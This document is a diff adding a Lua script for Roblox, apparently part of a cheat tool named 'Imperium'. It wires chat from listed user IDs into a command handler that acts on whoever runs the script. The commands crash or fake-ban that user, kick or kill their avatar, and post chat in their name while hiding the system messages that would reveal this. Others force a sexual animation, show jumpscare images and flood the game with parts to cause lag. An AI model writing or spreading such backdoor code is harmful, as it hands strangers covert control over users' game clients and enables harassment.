@@ -1,0 +1,332 @@
+local players = game:GetService("Players")
+local plr = players.LocalPlayer
+local OnBenx = false
+local prefix = "!"
+local Flinging = false
+
+local BrokenVip = {}
+local BrokenPremium = {}
+local BrokenStaff = {5127756688}
+
+local milk = {
+	12480466786;
+}
+
+local jumpscares = {
+    10755920324,
+    1119705746,
+    12213285275,
+    12293699441,
+    10727260846,
+    12342625873,
+    8804558033;
+}
+
+local function GetRoot(player)
+	return player.Character.HumanoidRootPart
+end
+
+local function GetLT(player)
+	return player.Character.LowerTorso
+end
+
+local function GetHum(player)
+	return player.Character.Humanoid
+end
+
+local function GetPing()
+	return (game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue())/1000
+end
+
+local function GetPlayer(UserDisplay)
+	if UserDisplay ~= "" then
+        for i,v in pairs(game.Players:GetPlayers()) do
+            if v.Name:lower():match(UserDisplay) or v.DisplayName:lower():match(UserDisplay) then
+                return v
+            end
+        end
+		return nil
+	else
+		return nil
+    end
+end
+
+local function PredictionTP(player,method)
+	local root = GetRoot(player)
+	local pos = root.Position
+	local vel = root.Velocity
+	GetRoot(plr).CFrame = CFrame.new((pos.X)+(vel.X)*(GetPing()*3.5),(pos.Y)+(vel.Y)*(GetPing()*2),(pos.Z)+(vel.Z)*(GetPing()*3.5))
+	if method == "safe" then
+		task.wait()
+		GetRoot(plr).CFrame = CFrame.new(pos)
+		task.wait()
+		GetRoot(plr).CFrame = CFrame.new((pos.X)+(vel.X)*(GetPing()*3.5),(pos.Y)+(vel.Y)*(GetPing()*2),(pos.Z)+(vel.Z)*(GetPing()*3.5))
+	end
+end
+
+local function ToggleFling(bool)
+	task.spawn(function()
+		if bool then
+			local RVelocity = nil
+			Flinging = true
+			repeat
+				pcall(function()
+					RVelocity = GetRoot(plr).Velocity 
+					GetRoot(plr).Velocity = Vector3.new(math.random(-150,150),9000,math.random(-150,150))
+					game.RunService.RenderStepped:wait()
+					GetRoot(plr).Velocity = RVelocity
+				end)
+				game.RunService.Heartbeat:wait()
+			until Flinging == false
+		else
+			Flinging = false
+		end
+	end)
+end
+
+local function Arg3(command)
+	local x = ""
+	for i,v in pairs(command) do
+		pcall(function ()
+			if i>=2 then
+				x = x.." "..command[i+1]
+			end
+		end)
+	end
+	return x
+end
+
+local function CheckCMD(arg,command)
+	if string.find(arg,prefix..""..command) then
+		return true
+	else
+		return false
+	end
+end
+
+local function GenImage(list)
+	task.spawn(function()
+		local ScreenGui = Instance.new("ScreenGui")
+		local Image = Instance.new("ImageLabel")
+		ScreenGui.Name = "Temp"
+		ScreenGui.IgnoreGuiInset = true
+		ScreenGui.Parent = game.CoreGui
+		Image.Name = "Image"
+		Image.ImageTransparency = 0
+		Image.BackgroundTransparency = 1
+		Image.Position = UDim2.new(0,0,0,0)
+		Image.Size = UDim2.new(1,0,1,0)
+		Image.Image = "rbxassetid://"..list[math.random(1,#list)]
+		Image.Parent = ScreenGui
+		task.wait(5)
+		ScreenGui:Destroy()
+	end)
+end
+
+local function BenxTP(player,offset)
+	GetRoot(plr).CFrame = GetLT(player).CFrame*CFrame.new(0,0,offset)*CFrame.Angles(-1.5,math.rad(0),0); task.wait()
+	GetRoot(plr).Velocity = Vector3.new(0,0,0)						
+end
+
+local function ExecuteCommand(Pid,msg)
+	local Speaker = players:GetPlayerByUserId(Pid)
+	local LowerCMD = msg:lower()
+	local Split = string.split(LowerCMD," ")
+	local LowerName, LowerDisplay = string.lower(plr.Name), string.lower(plr.DisplayName)
+	local ClientIsVip = table.find(BrokenVip,plr.UserId)
+	local ClientIsPremium = table.find(BrokenPremium,plr.UserId)
+	local SpeakerIsPremium = table.find(BrokenPremium,Speaker.UserId)
+	local SpeakerIsOwner = table.find(BrokenStaff,Speaker.UserId)
+	pcall(function()
+
+		local Allowed = string.find(LowerDisplay,Split[2]) or string.find(LowerName,Split[2])
+		if Allowed then
+
+			if CheckCMD(Split[1],"bring") then
+				if (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner)) then
+					GetRoot(plr).CFrame = GetRoot(Speaker).CFrame
+				end
+			end
+			if CheckCMD(Split[1],"c") then
+				if (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner)) then
+					local args = {[1] = ("/w "..Speaker.Name.." I'm using Imperium."),[2] = "All"}
+					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+					local args = {[1] = ("/leave"),[2] = "To "..Speaker.Name}
+					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+					task.wait(GetPing()+0.1)
+					for i,dm in pairs(plr.PlayerGui.Chat.Frame.ChatChannelParentFrame["Frame_MessageLogDisplay"].Scroller:GetChildren()) do
+						if dm:IsA("Frame") and dm:FindFirstChildOfClass("TextLabel") then
+							if string.find(dm:FindFirstChildOfClass("TextLabel").Text,"System") or string.find(dm:FindFirstChildOfClass("TextLabel").Text,"channel") then
+								dm.Visible = false
+							end
+						end
+					end
+					
+					for i,bubble in pairs(game.CoreGui.BubbleChat:GetDescendants()) do
+						if bubble:IsA("TextLabel") then
+							if string.find(bubble.Text,"System") then
+								bubble.Parent.Parent.Visible = false
+							end
+						end
+					end
+				end
+			end
+			if CheckCMD(Split[1],"fling") then
+				if (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner)) then
+					GetRoot(plr).CFrame = CFrame.new(9999999999,9999999999,9999999999)
+				end
+			end
+			if CheckCMD(Split[1],"freeze") then
+				if (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner)) then
+					for i,v in pairs(plr.Character:GetChildren()) do
+						if v:IsA("BasePart") then
+							v.Anchored = true
+						end
+					end
+				end
+			end
+			if CheckCMD(Split[1],"jumpscare") then
+				if (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner)) then
+					GenImage(jumpscares)
+				end
+			end
+			if CheckCMD(Split[1],"milk") then
+				if (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner)) then
+					GenImage(milk)
+				end
+			end
+			if CheckCMD(Split[1],"say") then
+				if (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner)) then
+					Message = Arg3(Split)
+					local args = {[1] = Message,[2] = "All"}
+					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+				end
+			end
+			if CheckCMD(Split[1],"slow") then
+				if (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner)) then
+					GetHum(plr).WalkSpeed = 5
+				end
+			end
+			if CheckCMD(Split[1],"unfreeze") then
+				if (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner)) then
+					for i,v in pairs(plr.Character:GetChildren()) do
+						if v:IsA("BasePart") then
+							v.Anchored = false
+						end
+					end
+				end
+			end
+			if CheckCMD(Split[1],"unslow") then
+				if (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner)) then
+					GetHum(plr).WalkSpeed = 16
+				end
+			end
+
+			if CheckCMD(Split[1],"benx") then
+				if (not ClientIsPremium) or (SpeakerIsOwner) then
+					OnBenx = true
+					repeat
+						task.wait()
+						pcall(function()
+							GetHum(plr).Sit = true
+							BenxTP(Speaker,-1.2); BenxTP(Speaker,-1.4); BenxTP(Speaker,-1.6); BenxTP(Speaker,-1.8); BenxTP(Speaker,-2.0)
+							BenxTP(Speaker,-2.2); BenxTP(Speaker,-2.4); BenxTP(Speaker,-2.6); BenxTP(Speaker,-2.8); BenxTP(Speaker,-3,0);
+							BenxTP(Speaker,-2.8); BenxTP(Speaker,-2.6); BenxTP(Speaker,-2.4); BenxTP(Speaker,-2.2); BenxTP(Speaker,-2.0);
+							BenxTP(Speaker,-1.8); BenxTP(Speaker,-1.6); BenxTP(Speaker,-1.4)
+						end)
+					until OnBenx == false
+				end
+			end
+			if CheckCMD(Split[1],"blind") then
+				if (not ClientIsPremium) or (SpeakerIsOwner) then
+					if game:GetService("Lighting"):FindFirstChild("Blur") then
+						game:GetService("Lighting"):FindFirstChild("Blur"):Destroy()
+					end
+					local Blur = Instance.new("BlurEffect")
+					Blur.Size = 30
+					Blur.Enabled = true
+					Blur.Parent = game:GetService("Lighting")
+				end
+			end
+			if CheckCMD(Split[1],"crash") then
+				if (not ClientIsPremium) or (SpeakerIsOwner) then
+					pcall(function()
+						while true do end
+					end)
+				end
+			end
+			if CheckCMD(Split[1],"fakeban") then
+				if (not ClientIsPremium) or (SpeakerIsOwner) then
+					pcall(function()
+						plr:Kick("You were permanently banned for using exploits.")
+					end)
+					task.wait(0.1)
+					while true do end
+				end
+			end
+			if CheckCMD(Split[1],"kick") then
+				if (not ClientIsPremium) or (SpeakerIsOwner) then
+					KickMessage = Arg3(Split)
+					plr:Kick("Kicked by"..Speaker.Name..". Reason: "..KickMessage)
+				end
+			end
+			if CheckCMD(Split[1],"kill") then
+				if (not ClientIsPremium) or (SpeakerIsOwner) then
+					GetHum(plr):ChangeState(15)
+				end
+			end
+			if CheckCMD(Split[1],"lag") then
+				if (not ClientIsPremium) or (SpeakerIsOwner) then
+					task.spawn(function()
+						local function SpawnBall()
+							local part = Instance.new("Part")
+							part.Shape = Enum.PartType.Ball
+							part.Name = "XD"
+							part.Size = Vector3.new(1,1,1)
+							part.Position = Vector3.new(-61, 300, -228)
+							part.Transparency = 0.5
+							part.CanCollide = true
+							part.Anchored = false
+							part.Parent = game.Workspace
+						end
+						while task.wait(0.15) do
+							SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall();
+							SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall();
+							SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall();
+							SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall();
+							SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall();
+							SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall();
+							SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall();
+							SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall();
+							SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall();
+							SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall();
+							SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall();
+							SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall(); SpawnBall();
+						end
+					end)
+				end
+			end
+			if CheckCMD(Split[1],"unbenx") then
+				if (not ClientIsPremium) or (SpeakerIsOwner) then
+					OnBenx = false
+				end
+			end
+
+		end
+	end)
+end
+
+for i,v in pairs(players:GetPlayers()) do
+	if table.find(BrokenVip,v.UserId) then
+		v.Chatted:Connect(function(command)
+			ExecuteCommand(v.UserId,command)
+		end)
+	end
+end
+players.PlayerAdded:Connect(function(v)
+	if table.find(BrokenVip,v.UserId) then
+		v.Chatted:Connect(function(command)
+			ExecuteCommand(v.UserId,command)
+		end)
+	end
+end)
